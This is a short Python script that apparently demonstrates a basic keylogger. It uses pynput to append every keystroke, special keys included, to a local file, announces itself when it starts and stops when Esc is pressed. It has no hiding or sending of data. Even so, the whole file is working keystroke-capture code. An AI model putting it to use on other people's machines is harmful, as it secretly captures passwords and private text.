from pynput import keyboard
import time

# The file where we will save the keystrokes
log_file = "key_log.txt"

def on_press(key):
    """
    This function runs every time a key is pressed.
    """
    try:
        # Alphanumeric keys (letters, numbers) have a 'char' attribute
        current_key = str(key.char)
    except AttributeError:
        # Special keys (Space, Enter, Shift) do not have 'char'
        if key == keyboard.Key.space:
            current_key = " "
        elif key == keyboard.Key.enter:
            current_key = "\n"
        else:
            current_key = " [" + str(key) + "] "

    # Append the keystroke to the file immediately
    with open(log_file, "a") as f:
        f.write(current_key)

def on_release(key):
    """
    This function runs when a key is released.
    We use it to stop the program safely.
    """
    if key == keyboard.Key.esc:
        # Stop listener if Escape key is pressed
        return False

# Setup the listener
print("Keylogger started... (Press ESC to stop)")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()